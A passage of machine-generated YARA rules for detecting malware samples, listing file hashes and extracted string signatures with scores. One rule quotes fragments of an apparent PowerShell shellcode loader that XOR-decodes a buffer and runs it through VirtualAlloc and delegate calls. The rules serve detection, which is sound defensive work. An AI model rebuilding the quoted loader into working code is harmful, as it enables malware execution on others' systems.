      $s9 = "XPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGX" ascii /* score: '6.50'*/
      $s10 = " volatile" fullword ascii /* score: '6.00'*/
      $s11 = "cKeyToken=\"6595b64144ccf1df\" language=\"*\"></assemblyIdentity></dependentAssembly></dependency><trustInfo xmlns=\"urn:schemas" ascii /* score: '6.00'*/
      $s12 = "SeDebugPrivilege" fullword ascii /* PEStudio Blacklist: priv */ /* score: '4.86'*/ /* Goodware String - occured 141 times */
      $s13 = "Process" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 571 times */
      $s14 = "L$@f9N:u" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s15 = "\\$D8D$" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s16 = "F8f;D$<u" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s17 = "D$(0K@" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s18 = "L$4QRPj" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s19 = "Whois lookups are not valid on machine names" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s20 = "tTf;|$ ~" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _2f6c15714bff3a5c6761ef2f1e61af96fac718abacefdb4e74c9a94ab5974600_77373a2d0c22152cf281cbedf8d8e8f71b70e3196faa6f3d8fa5392bd2_3 {
   meta:
      description = "mw - from files 2f6c15714bff3a5c6761ef2f1e61af96fac718abacefdb4e74c9a94ab5974600, 77373a2d0c22152cf281cbedf8d8e8f71b70e3196faa6f3d8fa5392bd25109a9"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "2f6c15714bff3a5c6761ef2f1e61af96fac718abacefdb4e74c9a94ab5974600"
      hash2 = "77373a2d0c22152cf281cbedf8d8e8f71b70e3196faa6f3d8fa5392bd25109a9"
   strings:
      $s1 = ".GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '15.00'*/
      $s2 = "libloaderapi.h" fullword ascii /* score: '13.00'*/
      $s3 = "9GNU C17 12 20220819 -m32 -mtune=generic -march=pentiumpro -g -O2 -fno-PIE" fullword ascii /* score: '12.00'*/
      $s4 = " __mingw_get_msvcrt_handle" fullword ascii /* score: '9.00'*/
      $s5 = "GetModuleHandleW@4" fullword ascii /* score: '9.00'*/
      $s6 = "iargval" fullword ascii /* score: '8.00'*/
      $s7 = "signbit" fullword ascii /* score: '8.00'*/
      $s8 = "private_mem" fullword ascii /* score: '7.00'*/
      $s9 = "Omemset" fullword ascii /* score: '6.00'*/
      $s10 = "Gformat_scan" fullword ascii /* score: '5.00'*/
      $s11 = "digits32" fullword ascii /* score: '5.00'*/
      $s12 = "topbit" fullword ascii /* score: '5.00'*/
      $s13 = "argval" fullword ascii /* score: '5.00'*/
      $s14 = "_internal_mbstate.1" fullword ascii /* score: '4.00'*/
      $s15 = "____lc_codepage_func" fullword ascii /* score: '4.00'*/
      $s16 = "small_ilim" fullword ascii /* score: '4.00'*/
      $s17 = "+dtoa_lock_cleanup" fullword ascii /* score: '4.00'*/
      $s18 = "=UUUUw" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s19 = "_Mbstatet" fullword ascii /* score: '4.00'*/
      $s20 = "<__multadd_D2A" fullword ascii /* score: '4.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 800KB and ( 8 of them )
      ) or ( all of them )
}

rule _568fd0475023168370fa2fd1d4467b3eaa41cd320b142a092f5496b93cd03298_77e5b41845ef18bf4281a89a19b9da9f7f2949f92d07d68ed85ff25b31_4 {
   meta:
      description = "mw - from files 568fd0475023168370fa2fd1d4467b3eaa41cd320b142a092f5496b93cd03298, 77e5b41845ef18bf4281a89a19b9da9f7f2949f92d07d68ed85ff25b31061ff1, 7ff11ca6d119185d7ebdfb1d5a2e88cffda19f13e4b582aa5463e1b3bc763938, bb0276cbab8e83a2d0e937c00900c258c90245ba51e0774df933a9b500c3b330, bd0d8e1c8b6ab5c6d30252f25cc57c7ecbbcf8cf8b9719d3735564a395369e30, dd365bece1468d674807de41d98a37f039c663209c98d649431ef77a6f1debcb, eaad0abb560da91e8eb3d7cb3bcf53c9008d24693a1a0929ce678c2816d2b135"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "568fd0475023168370fa2fd1d4467b3eaa41cd320b142a092f5496b93cd03298"
      hash2 = "77e5b41845ef18bf4281a89a19b9da9f7f2949f92d07d68ed85ff25b31061ff1"
      hash3 = "7ff11ca6d119185d7ebdfb1d5a2e88cffda19f13e4b582aa5463e1b3bc763938"
      hash4 = "bb0276cbab8e83a2d0e937c00900c258c90245ba51e0774df933a9b500c3b330"
      hash5 = "bd0d8e1c8b6ab5c6d30252f25cc57c7ecbbcf8cf8b9719d3735564a395369e30"
      hash6 = "dd365bece1468d674807de41d98a37f039c663209c98d649431ef77a6f1debcb"
      hash7 = "eaad0abb560da91e8eb3d7cb3bcf53c9008d24693a1a0929ce678c2816d2b135"
   strings:
      $s1 = "oration) and you.  Please read them.  They apply to the software you are downloading from Systinternals.com, which includes the " ascii /* score: '23.00'*/
      $s2 = "\\pard\\keepn\\fi-360\\li720\\sb120\\sa120\\tx720\\lang1036\\'b7\\tab tout  ce qui est reli\\'e9 au logiciel, aux services ou au" ascii /* score: '13.00'*/
      $s3 = "\\pard\\fi-363\\li720\\sb120\\sa120\\tx720\\'b7\\tab anything related to the software, services, content (including code) on thi" ascii /* score: '13.00'*/
      $s4 = "\\pard\\sb240\\lang1036 Remarque : Ce logiciel \\'e9tant distribu\\'e9 au Qu\\'e9bec, Canada, certaines des clauses dans ce cont" ascii /* score: '11.00'*/
      $s5 = "\\pard\\fi-363\\li720\\sb120\\sa120\\'b7\\tab reverse engineer, decompile or disassemble the binary versions of the software, ex" ascii /* score: '11.00'*/
      $s6 = "\\pard\\fi-363\\li720\\sb120\\sa120\\tx720\\'b7\\tab les r\\'e9clamations au titre de violation de contrat ou de garantie, ou au" ascii /* score: '10.00'*/
      $s7 = "\\pard\\sb120\\sa120 EXON\\'c9RATION DE GARANTIE.\\b0  Le logiciel vis\\'e9 par une licence est offert \\'ab tel quel \\'bb. Tou" ascii /* score: '10.00'*/
      $s8 = "ou must comply with all domestic and international export laws and regulations that apply to the software.  These laws include r" ascii /* score: '10.00'*/
      $s9 = "us par les lois de votre pays.  Le pr\\'e9sent contrat ne modifie pas les droits que vous conf\\'e8rent les lois de votre pays s" ascii /* score: '9.00'*/
      $s10 = "n usage particulier et d'absence de contrefa\\'e7on sont exclues.\\par" fullword ascii /* score: '9.00'*/
      $s11 = "sation de ce logiciel est \\'e0 votre seule risque et p\\'e9ril. Sysinternals n'accorde aucune autre garantie expresse. Vous pou" ascii /* score: '9.00'*/
      $s12 = "z b\\'e9n\\'e9ficier de droits additionnels en vertu du droit local sur la protection dues consommateurs, que ce contrat ne peut" ascii /* score: '8.00'*/
      $s13 = "ces and support services that you use, are the entire agreement for the software and support services.\\par" fullword ascii /* score: '7.00'*/
      $s14 = " compris le code) figurant sur des sites Internet tiers ou dans des programmes tiers ; et\\par" fullword ascii /* score: '7.00'*/
      $s15 = "ction laws, unfair competition laws, and in tort.\\b\\par" fullword ascii /* score: '7.00'*/
      $s16 = "\\pard\\fi-363\\li720\\sb120\\sa120\\tx720\\b0\\'b7\\tab work around any technical limitations in the binary versions of the sof" ascii /* score: '7.00'*/
      $s17 = "\\pard\\sb120\\sa120\\b0\\fs19 These license terms are an agreement between Sysinternals (a wholly owned subsidiary of Microsoft" ascii /* score: '7.00'*/
      $s18 = "00 $ US. Vous ne pouvez pr\\'e9tendre \\'e0 aucune indemnisation pour les autres dommages, y compris les dommages sp\\'e9ciaux, " ascii /* score: '7.00'*/
      $s19 = "\\pard\\fi-363\\li720\\sb120\\sa120\\'b7\\tab claims for breach of contract, breach of warranty, guarantee or condition, strict " ascii /* score: '5.00'*/
      $s20 = "\\pard\\sb120\\sa120 Elle s'applique \\'e9galement, m\\'eame si Sysinternals connaissait ou devrait conna\\'eetre l'\\'e9ventual" ascii /* score: '5.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( 8 of them )
      ) or ( all of them )
}

rule _5a701e7086350c67b542a0ba59076be8b66537ca14eecbe9815d266c42856f44_73f23c2fce59ad359661302bf39adcfbc522fd80208fb5f22cd69fdde4_5 {
   meta:
      description = "mw - from files 5a701e7086350c67b542a0ba59076be8b66537ca14eecbe9815d266c42856f44, 73f23c2fce59ad359661302bf39adcfbc522fd80208fb5f22cd69fdde40ae3f8, 8e44acb46f8012f3b913327f908c0c5cc4d8ac4185836f1dd589dec4fc813eb6, aeb5278f687bb42d021fb488789189e622f13118c9c175d603ab9f5b6d99c460"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "5a701e7086350c67b542a0ba59076be8b66537ca14eecbe9815d266c42856f44"
      hash2 = "73f23c2fce59ad359661302bf39adcfbc522fd80208fb5f22cd69fdde40ae3f8"
      hash3 = "8e44acb46f8012f3b913327f908c0c5cc4d8ac4185836f1dd589dec4fc813eb6"
      hash4 = "aeb5278f687bb42d021fb488789189e622f13118c9c175d603ab9f5b6d99c460"
   strings:
      $s1 = "%SystemRoot%\\System32\\calc.exe" fullword ascii /* score: '23.00'*/
      $s2 = "vector too long" fullword ascii /* score: '6.00'*/
      $s3 = "9>powf" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s4 = "fC9<`u" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s5 = "D=M76?LRich66?L" fullword ascii /* score: '4.00'*/
      $s6 = "Rich}&k" fullword ascii /* score: '4.00'*/
      $s7 = "gWinSta0\\Default" fullword wide /* score: '4.00'*/
      $s8 = "L!d$(L!d$@D" fullword ascii /* score: '1.00'*/
      $s9 = "G;M&6?L" fullword ascii /* score: '1.00'*/
      $s10 = "G<M<6?L" fullword ascii /* score: '1.00'*/
      $s11 = "D$HL9gXt" fullword ascii /* score: '1.00'*/
      $s12 = "D8T8>t" fullword ascii /* score: '1.00'*/
      $s13 = "D6M46?L" fullword ascii /* score: '1.00'*/
      $s14 = " A_A^A\\_^][" fullword ascii /* score: '1.00'*/
      $s15 = "/H+9t(H" fullword ascii /* score: '1.00'*/
      $s16 = "ue!T$(H!T$ " fullword ascii /* score: '1.00'*/
      $s17 = "}(D8}pt-H" fullword ascii /* score: '1.00'*/
      $s18 = "d$dD;d$lt^" fullword ascii /* score: '1.00'*/
      $s19 = "D8L$0uP" fullword ascii /* score: '1.00'*/
      $s20 = "G:Mx6?Lm^>M16?L66>LG6?L" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _281f7edc9ed294b8a1589b8377edc747aaa6ebdaf173dadc96e12c77e7a7a4b3_2c1202010c1914e517f2d1303c82283286adbf56be408d0facadcba515_6 {
   meta:
      description = "mw - from files 281f7edc9ed294b8a1589b8377edc747aaa6ebdaf173dadc96e12c77e7a7a4b3, 2c1202010c1914e517f2d1303c82283286adbf56be408d0facadcba5154598fe, 568fd0475023168370fa2fd1d4467b3eaa41cd320b142a092f5496b93cd03298, 5a701e7086350c67b542a0ba59076be8b66537ca14eecbe9815d266c42856f44, 73f23c2fce59ad359661302bf39adcfbc522fd80208fb5f22cd69fdde40ae3f8, 77e5b41845ef18bf4281a89a19b9da9f7f2949f92d07d68ed85ff25b31061ff1, 7ff11ca6d119185d7ebdfb1d5a2e88cffda19f13e4b582aa5463e1b3bc763938, 8e44acb46f8012f3b913327f908c0c5cc4d8ac4185836f1dd589dec4fc813eb6, a46f92dffeda6201d3504179c83397f2dd9bb24617b623b1aeaf3be3ce503058, aeb5278f687bb42d021fb488789189e622f13118c9c175d603ab9f5b6d99c460, bb0276cbab8e83a2d0e937c00900c258c90245ba51e0774df933a9b500c3b330, bd0d8e1c8b6ab5c6d30252f25cc57c7ecbbcf8cf8b9719d3735564a395369e30, dd365bece1468d674807de41d98a37f039c663209c98d649431ef77a6f1debcb, eaad0abb560da91e8eb3d7cb3bcf53c9008d24693a1a0929ce678c2816d2b135"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "281f7edc9ed294b8a1589b8377edc747aaa6ebdaf173dadc96e12c77e7a7a4b3"
      hash2 = "2c1202010c1914e517f2d1303c82283286adbf56be408d0facadcba5154598fe"
      hash3 = "568fd0475023168370fa2fd1d4467b3eaa41cd320b142a092f5496b93cd03298"
      hash4 = "5a701e7086350c67b542a0ba59076be8b66537ca14eecbe9815d266c42856f44"
      hash5 = "73f23c2fce59ad359661302bf39adcfbc522fd80208fb5f22cd69fdde40ae3f8"
      hash6 = "77e5b41845ef18bf4281a89a19b9da9f7f2949f92d07d68ed85ff25b31061ff1"
      hash7 = "7ff11ca6d119185d7ebdfb1d5a2e88cffda19f13e4b582aa5463e1b3bc763938"
      hash8 = "8e44acb46f8012f3b913327f908c0c5cc4d8ac4185836f1dd589dec4fc813eb6"
      hash9 = "a46f92dffeda6201d3504179c83397f2dd9bb24617b623b1aeaf3be3ce503058"
      hash10 = "aeb5278f687bb42d021fb488789189e622f13118c9c175d603ab9f5b6d99c460"
      hash11 = "bb0276cbab8e83a2d0e937c00900c258c90245ba51e0774df933a9b500c3b330"
      hash12 = "bd0d8e1c8b6ab5c6d30252f25cc57c7ecbbcf8cf8b9719d3735564a395369e30"
      hash13 = "dd365bece1468d674807de41d98a37f039c663209c98d649431ef77a6f1debcb"
      hash14 = "eaad0abb560da91e8eb3d7cb3bcf53c9008d24693a1a0929ce678c2816d2b135"
   strings:
      $s1 = " Type Descriptor'" fullword ascii /* score: '10.00'*/
      $s2 = " Base Class Descriptor at (" fullword ascii /* score: '6.00'*/
      $s3 = " Class Hierarchy Descriptor'" fullword ascii /* score: '6.00'*/
      $s4 = " Complete Object Locator'" fullword ascii /* score: '5.00'*/
      $s5 = " delete[]" fullword ascii /* score: '4.00'*/
      $s6 = " delete" fullword ascii /* score: '3.00'*/
      $s7 = " new[]" fullword ascii /* score: '1.00'*/
      $s8 = " Base Class Array'" fullword ascii /* score: '0.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 29000KB and ( all of them )
      ) or ( all of them )
}

rule _2c1202010c1914e517f2d1303c82283286adbf56be408d0facadcba5154598fe_568fd0475023168370fa2fd1d4467b3eaa41cd320b142a092f5496b93c_7 {
   meta:
      description = "mw - from files 2c1202010c1914e517f2d1303c82283286adbf56be408d0facadcba5154598fe, 568fd0475023168370fa2fd1d4467b3eaa41cd320b142a092f5496b93cd03298, 5a701e7086350c67b542a0ba59076be8b66537ca14eecbe9815d266c42856f44, 73f23c2fce59ad359661302bf39adcfbc522fd80208fb5f22cd69fdde40ae3f8, 7ff11ca6d119185d7ebdfb1d5a2e88cffda19f13e4b582aa5463e1b3bc763938, 8e44acb46f8012f3b913327f908c0c5cc4d8ac4185836f1dd589dec4fc813eb6, aeb5278f687bb42d021fb488789189e622f13118c9c175d603ab9f5b6d99c460, dd365bece1468d674807de41d98a37f039c663209c98d649431ef77a6f1debcb"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "2c1202010c1914e517f2d1303c82283286adbf56be408d0facadcba5154598fe"
      hash2 = "568fd0475023168370fa2fd1d4467b3eaa41cd320b142a092f5496b93cd03298"
      hash3 = "5a701e7086350c67b542a0ba59076be8b66537ca14eecbe9815d266c42856f44"
      hash4 = "73f23c2fce59ad359661302bf39adcfbc522fd80208fb5f22cd69fdde40ae3f8"
      hash5 = "7ff11ca6d119185d7ebdfb1d5a2e88cffda19f13e4b582aa5463e1b3bc763938"
      hash6 = "8e44acb46f8012f3b913327f908c0c5cc4d8ac4185836f1dd589dec4fc813eb6"
      hash7 = "aeb5278f687bb42d021fb488789189e622f13118c9c175d603ab9f5b6d99c460"
      hash8 = "dd365bece1468d674807de41d98a37f039c663209c98d649431ef77a6f1debcb"
   strings:
      $s1 = "owner dead" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s2 = "connection already in progress" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s3 = "network reset" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s4 = "network down" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s5 = "wrong protocol type" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 567 times */
      $s6 = "connection aborted" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 568 times */
      $s7 = "protocol not supported" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 568 times */
      $s8 = "network unreachable" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 569 times */
      $s9 = "host unreachable" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.43'*/ /* Goodware String - occured 571 times */
      $s10 = "protocol error" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.41'*/ /* Goodware String - occured 588 times */
      $s11 = "connection refused" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.40'*/ /* Goodware String - occured 597 times */
      $s12 = " A_A^_" fullword ascii /* score: '1.00'*/
      $s13 = " A_A^A\\_^" fullword ascii /* score: '1.00'*/
      $s14 = " A_A^A]A\\_^]" fullword ascii /* score: '1.00'*/
      $s15 = " A_A^A]A\\_" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 29000KB and ( 8 of them )
      ) or ( all of them )
}

rule _2c1202010c1914e517f2d1303c82283286adbf56be408d0facadcba5154598fe_cb4257531a81242176d9921778a8cc95dcf6c592563f97ccc0e7788a3c_8 {
   meta:
      description = "mw - from files 2c1202010c1914e517f2d1303c82283286adbf56be408d0facadcba5154598fe, cb4257531a81242176d9921778a8cc95dcf6c592563f97ccc0e7788a3cafc6e9"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "2c1202010c1914e517f2d1303c82283286adbf56be408d0facadcba5154598fe"
      hash2 = "cb4257531a81242176d9921778a8cc95dcf6c592563f97ccc0e7788a3cafc6e9"
   strings:
      $s1 = "source" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.00'*/ /* Goodware String - occured 998 times */
      $s2 = "wOUigi<" fullword ascii /* score: '4.00'*/
      $s3 = "YedcCH}" fullword ascii /* score: '4.00'*/
      $s4 = "z1_|'B" fullword ascii /* score: '1.00'*/
      $s5 = "fdxfv%" fullword ascii /* score: '1.00'*/
      $s6 = "$>Mm/JhA" fullword ascii /* score: '1.00'*/
      $s7 = "qTm_fC=" fullword ascii /* score: '1.00'*/
      $s8 = "?_15]>" fullword ascii /* score: '1.00'*/
      $s9 = "J#}QU^u" fullword ascii /* score: '1.00'*/
      $s10 = "!#QRFt" fullword ascii /* score: '1.00'*/
      $s11 = "M}8vhJ" fullword ascii /* score: '1.00'*/
      $s12 = "oB4Do4" fullword ascii /* score: '1.00'*/
      $s13 = "}BzJ88" fullword ascii /* score: '1.00'*/
      $s14 = "2\\fWQx" fullword ascii /* score: '1.00'*/
      $s15 = "VY5[;o" fullword ascii /* score: '1.00'*/
      $s16 = "$g#8lu#" fullword ascii /* score: '1.00'*/
      $s17 = ";uC#h/" fullword ascii /* score: '1.00'*/
      $s18 = "aS&v&*" fullword ascii /* score: '1.00'*/
      $s19 = "Dd g4X3" fullword ascii /* score: '1.00'*/
      $s20 = "Y;C;8V" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 29000KB and ( 8 of them )
      ) or ( all of them )
}

rule _2c1202010c1914e517f2d1303c82283286adbf56be408d0facadcba5154598fe_5a701e7086350c67b542a0ba59076be8b66537ca14eecbe9815d266c42_9 {
   meta:
      description = "mw - from files 2c1202010c1914e517f2d1303c82283286adbf56be408d0facadcba5154598fe, 5a701e7086350c67b542a0ba59076be8b66537ca14eecbe9815d266c42856f44, 73f23c2fce59ad359661302bf39adcfbc522fd80208fb5f22cd69fdde40ae3f8, 8e44acb46f8012f3b913327f908c0c5cc4d8ac4185836f1dd589dec4fc813eb6, aeb5278f687bb42d021fb488789189e622f13118c9c175d603ab9f5b6d99c460"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "2c1202010c1914e517f2d1303c82283286adbf56be408d0facadcba5154598fe"
      hash2 = "5a701e7086350c67b542a0ba59076be8b66537ca14eecbe9815d266c42856f44"
      hash3 = "73f23c2fce59ad359661302bf39adcfbc522fd80208fb5f22cd69fdde40ae3f8"
      hash4 = "8e44acb46f8012f3b913327f908c0c5cc4d8ac4185836f1dd589dec4fc813eb6"
      hash5 = "aeb5278f687bb42d021fb488789189e622f13118c9c175d603ab9f5b6d99c460"
   strings:
      $s1 = "u3HcH<H" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s2 = "L$&8\\$&t,8Y" fullword ascii /* score: '1.00'*/
      $s3 = "u4I9}(" fullword ascii /* score: '1.00'*/
      $s4 = "H;xXu5" fullword ascii /* score: '1.00'*/
      $s5 = ";I9}(tiH" fullword ascii /* score: '1.00'*/
      $s6 = "D!l$xA" fullword ascii /* score: '1.00'*/
      $s7 = " H3E H3E" fullword ascii /* score: '1.00'*/
      $s8 = "L$ |+L;" fullword ascii /* score: '1.00'*/
      $s9 = "H97u+A" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 29000KB and ( all of them )
      ) or ( all of them )
}

rule _06d933b141bdb7cbd349deb355092adecf43d70c95c1f130908b4655e605d751_8897994e897bb1b2d22188d332ea972eff725b3b02b9dab0e5b5e73ab6_10 {
   meta:
      description = "mw - from files 06d933b141bdb7cbd349deb355092adecf43d70c95c1f130908b4655e605d751, 8897994e897bb1b2d22188d332ea972eff725b3b02b9dab0e5b5e73ab60d79c4"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "06d933b141bdb7cbd349deb355092adecf43d70c95c1f130908b4655e605d751"
      hash2 = "8897994e897bb1b2d22188d332ea972eff725b3b02b9dab0e5b5e73ab60d79c4"
   strings:
      $s1 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" fullword ascii /* score: '7.00'*/
      $s2 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii /* score: '5.00'*/
      $s3 = "PaddingMode" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.95'*/ /* Goodware String - occured 49 times */
      $s4 = "CipherMode" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.95'*/ /* Goodware String - occured 54 times */
      $s5 = "CreateDecryptor" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.92'*/ /* Goodware String - occured 76 times */
      $s6 = "System.Security.Cryptography" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.70'*/ /* Goodware String - occured 305 times */
      $s7 = "Console" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.47'*/ /* Goodware String - occured 526 times */
      $s8 = "Encoding" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.19'*/ /* Goodware String - occured 809 times */
      $s9 = "System.Runtime.CompilerServices" fullword ascii /* PEStudio Blacklist: strings */ /* score: '3.05'*/ /* Goodware String - occured 1950 times */
      $s10 = "System.Reflection" fullword ascii /* PEStudio Blacklist: strings */ /* score: '2.81'*/ /* Goodware String - occured 2186 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and ( all of them )
      ) or ( all of them )
}

rule _35f634a00e48d1431c6845e2b72fdc79b373e7d905c6a79b0ed4755b4e8b023b_c01068e733eb7056b1c9c6ec8692c379c28fa775445755ee913153ca2e_11 {
   meta:
      description = "mw - from files 35f634a00e48d1431c6845e2b72fdc79b373e7d905c6a79b0ed4755b4e8b023b, c01068e733eb7056b1c9c6ec8692c379c28fa775445755ee913153ca2e69fc6b"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "35f634a00e48d1431c6845e2b72fdc79b373e7d905c6a79b0ed4755b4e8b023b"
      hash2 = "c01068e733eb7056b1c9c6ec8692c379c28fa775445755ee913153ca2e69fc6b"
   strings:
      $s1 = "$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAll" ascii /* score: '27.00'*/
      $s2 = "$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAll" ascii /* score: '27.00'*/
      $s3 = "$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Locatio" ascii /* score: '24.00'*/
      $s4 = "n.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')" fullword ascii /* score: '24.00'*/
      $s5 = "$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([Int" ascii /* score: '15.00'*/
      $s6 = "return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((" ascii /* score: '15.00'*/
      $s7 = "$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([Int" ascii /* score: '15.00'*/
      $s8 = "function func_get_proc_address {" fullword ascii /* score: '12.00'*/
      $s9 = "$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string" ascii /* score: '11.00'*/
      $s10 = "$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string" ascii /* score: '11.00'*/
      $s11 = "$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementa" ascii /* score: '10.00'*/
      $s12 = "return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((" ascii /* score: '10.00'*/
      $s13 = "[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)" fullword ascii /* score: '10.00'*/
      $s14 = "oc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))" fullword ascii /* score: '9.00'*/
      $s15 = "$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Locatio" ascii /* score: '9.00'*/
      $s16 = "New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))" fullword ascii /* score: '9.00'*/
      $s17 = "function func_get_delegate_type {" fullword ascii /* score: '9.00'*/
      $s18 = "$var_code[$x] = $var_code[$x] -bxor 35" fullword ascii /* score: '8.00'*/
      $s19 = "for ($x = 0; $x -lt $var_code.Count; $x++) {" fullword ascii /* score: '8.00'*/
      $s20 = "arameters).SetImplementationFlags('Runtime, Managed')" fullword ascii /* score: '7.00'*/
   condition:
      ( ( uint16(0) == 0x6553 or uint16(0) == 0x7566 ) and filesize < 10KB and ( 8 of them )
      ) or ( all of them )
}

rule _281f7edc9ed294b8a1589b8377edc747aaa6ebdaf173dadc96e12c77e7a7a4b3_2c1202010c1914e517f2d1303c82283286adbf56be408d0facadcba515_12 {
   meta:
      description = "mw - from files 281f7edc9ed294b8a1589b8377edc747aaa6ebdaf173dadc96e12c77e7a7a4b3, 2c1202010c1914e517f2d1303c82283286adbf56be408d0facadcba5154598fe, 5a701e7086350c67b542a0ba59076be8b66537ca14eecbe9815d266c42856f44, 73f23c2fce59ad359661302bf39adcfbc522fd80208fb5f22cd69fdde40ae3f8, 8e44acb46f8012f3b913327f908c0c5cc4d8ac4185836f1dd589dec4fc813eb6, aeb5278f687bb42d021fb488789189e622f13118c9c175d603ab9f5b6d99c460"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "281f7edc9ed294b8a1589b8377edc747aaa6ebdaf173dadc96e12c77e7a7a4b3"
      hash2 = "2c1202010c1914e517f2d1303c82283286adbf56be408d0facadcba5154598fe"
      hash3 = "5a701e7086350c67b542a0ba59076be8b66537ca14eecbe9815d266c42856f44"
      hash4 = "73f23c2fce59ad359661302bf39adcfbc522fd80208fb5f22cd69fdde40ae3f8"
      hash5 = "8e44acb46f8012f3b913327f908c0c5cc4d8ac4185836f1dd589dec4fc813eb6"
      hash6 = "aeb5278f687bb42d021fb488789189e622f13118c9c175d603ab9f5b6d99c460"
   strings:
